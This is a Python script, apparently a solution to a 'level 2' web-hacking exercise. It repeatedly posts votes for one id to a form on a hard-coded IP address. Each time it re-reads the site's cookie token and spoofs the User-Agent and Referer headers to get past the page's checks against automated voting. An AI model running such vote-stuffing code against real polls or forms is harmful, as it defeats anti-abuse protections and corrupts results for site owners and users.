#!/usr/bin/python3

import requests, sys

try:
    session = requests.Session()
    url = 'http://158.69.76.135/level2.php'
    get = session.get(url)
    print("connectins a session from the url and gettng a response")
except:
    raise ValueError("error")
    sys.exit(1)

for num  in range (1024):
    try:
        cookie = dict(session.cookies)
        print("getting cookies")
    except:
        print("Error getting the cookies")
        sys.exit(1)

    my_obj = {"id": '125', 'holdthedoor': 'Submit', 'key': cookie['HoldTheDoor']}


    """ USe the head dict yto set up an user agent and a  referer
    
            User Agent: the OS where the reques comes
            Refere: the lin where the request comes we use the same ad    ress"""
    try:
        head = {}
        head.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36'})
        head.update({'Referer': url})
        print("send the response to the user Agent")
    except:
        print("header Error")
        sys.exit(1)

    #send the respons to the url passing the url obj, and header
    response = session.post(url, my_obj, headers=head)
    print(num)
    print("Success")

print("See You later Hacker")
